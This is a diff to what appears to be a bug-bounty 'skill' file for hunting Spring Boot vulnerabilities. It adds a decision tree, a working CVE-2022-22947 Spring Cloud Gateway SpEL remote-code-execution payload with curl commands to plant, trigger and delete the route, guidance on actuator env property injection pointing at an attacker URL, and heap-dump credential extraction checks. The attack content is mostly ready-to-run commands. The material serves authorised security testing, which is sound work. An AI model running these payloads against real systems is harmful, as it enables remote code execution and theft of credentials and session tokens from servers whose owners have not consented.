@@ -1,6 +1,6 @@
 ---
 name: hunt-springboot
-description: Hunt Spring Boot specific vulnerabilities — Actuator endpoints (heapdump, env, loggers, mappings, shutdown), Spring Expression Language (SpEL) injection → RCE, H2 console RCE, Jolokia JMX exposure, Spring4Shell (CVE-2022-22965), Spring Cloud Function SPEL (CVE-2022-22963), heap dump credential extraction. Use when target runs Spring Boot — detected via X-Application-Context header, /actuator, Whitelabel Error Page, or Java stack traces.
+description: Hunt Spring Boot specific vulnerabilities — Actuator endpoints (heapdump, env, loggers, mappings, shutdown), Spring Expression Language (SpEL) injection → RCE, H2 console RCE, Jolokia JMX exposure, Spring4Shell (CVE-2022-22965), Spring Cloud Function SpEL (CVE-2022-22963), Spring Cloud Gateway actuator SpEL (CVE-2022-22947), heap dump credential extraction. Use when target runs Spring Boot — detected via X-Application-Context header, /actuator, Whitelabel Error Page, or Java stack traces.
 sources: hackerone_public, cve_database, spring_security_advisories
 report_count: 16
 ---
@@ -18,6 +18,14 @@ Spring Boot Actuator `/actuator/heapdump` exposed = heap dump with all secrets i
 - **H2 Console (`/h2-console`)** — in-memory DB admin UI → SQL query execution → potential RCE via `CREATE ALIAS` trick
 - **SpEL injection** — Spring Expression Language in template fields, `@Value` annotations, SpEL-processed request params → RCE
 - **Spring4Shell CVE-2022-22965** — Spring Framework < 5.3.18 + Tomcat → RCE via data binding
+- **Spring Cloud Gateway Actuator SpEL (CVE-2022-22947)** — if `/actuator/gateway/routes` is writable, POST a route with a SpEL filter → RCE
+
+**Decision tree (adapts to any Spring Boot target):**
+1. `/actuator` (or `/manage`, `/management`, custom base) returns actuator JSON? → Phase 2 enumerate. The management port may differ from the app port (commonly `:8081`, `:9001`) — scan it.
+2. `heapdump` exposed → Phase 3 (crown jewel: all in-memory secrets). `env`/`configprops` → secret read. `gateway/routes` POST-able → CVE-2022-22947 RCE. `jolokia` → Phase 7.
+3. Actuator locked down? Spring4Shell (data-binding), SpEL in app inputs (Phase 5), and H2 console (Phase 4) are independent of actuator — keep going.
+4. Any field that reflects `${...}`/`#{...}` → Phase 5 SpEL.
+Run every positive branch; a hardened actuator does not end the hunt.
 
 ---
 
@@ -71,6 +79,23 @@ curl -s "$BASE/mappings" | python3 -m json.tool 2>/dev/null | grep -oP '"pattern
 
 # Get Spring beans (lists all registered beans, reveals internal architecture)
 curl -s "$BASE/beans" | python3 -m json.tool 2>/dev/null | head -100
+```
+
+### Actuator-driven RCE paths (when write endpoints are exposed)
+
+```bash
+# A) Spring Cloud Gateway SpEL (CVE-2022-22947) — /actuator/gateway/routes writable
+curl -s -X POST "$BASE/gateway/routes/huntroute" -H "Content-Type: application/json" -d '{
+  "id":"huntroute","filters":[{"name":"AddResponseHeader","args":{
+    "name":"X-Hunt","value":"#{new String(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream().readAllBytes())}"}}],
+  "uri":"http://example.com","predicates":[{"name":"Path","args":{"_genkey_0":"/hunt/**"}}]}'
+curl -s -X POST "$BASE/gateway/refresh"
+curl -si "https://$TARGET/hunt/x" | grep -i "X-Hunt"      # header carries command output
+curl -s -X DELETE "$BASE/gateway/routes/huntroute"; curl -s -X POST "$BASE/gateway/refresh"  # clean up
+
+# B) /actuator/env property injection → RCE (when env is WRITABLE via POST, older setups).
+#    Point a reloadable datasource/log4j/eureka property at an attacker URL, then /refresh.
+#    Confirm via OOB callback (unique subdomain) — never claim RCE on a 200 alone.
 ```
 
 ---
@@ -198,7 +223,8 @@ curl -s "https://$TARGET/jolokia/exec/com.sun.management:type=DiagnosticCommand/
 
 | Spring Boot finding | Chain to | Impact |
 |--------------------|----------|--------|
-| `/actuator/heapdump` | Extract DB passwords, API keys from memory | Critical credential exfil |
+| `/actuator/heapdump` | Extract DB passwords, API keys, session tokens from memory | Critical credential exfil |
+| `/actuator/gateway/routes` POST + refresh | SpEL filter (CVE-2022-22947) → OS command | Critical RCE |
 | `/actuator/env` | Read all env vars including secrets | High |
 | H2 console accessible | CREATE ALIAS → RCE | Critical |
 | SpEL injection | `T(Runtime).exec()` → OS command | Critical RCE |
@@ -209,10 +235,11 @@ curl -s "https://$TARGET/jolokia/exec/com.sun.management:type=DiagnosticCommand/
 
 ## Validation
 
-✅ Heap dump: strings command extracts readable passwords/tokens from .hprof file
-✅ Actuator/env: secrets visible in JSON response
-✅ SpEL: arithmetic expression evaluates (7*7=49) or OOB callback received
-✅ H2 console: SQL executed, `id` output returned
+✅ Heap dump: `strings`/MAT extracts readable passwords/tokens from the .hprof file (quote the exact secret)
+✅ Actuator/env: real secrets visible in JSON response (not just masked `******`)
+✅ Gateway SpEL RCE: command output lands in the response header OR OOB callback on a unique subdomain
+✅ SpEL: `#{7*7}`→49 reflected, then RCE confirmed by command output or OOB (unique subdomain) — not "no error"
+✅ H2 console: SQL executed, `CALL EXEC('id')` output returned
 
 **Severity:**
 - Heapdump with credentials: Critical
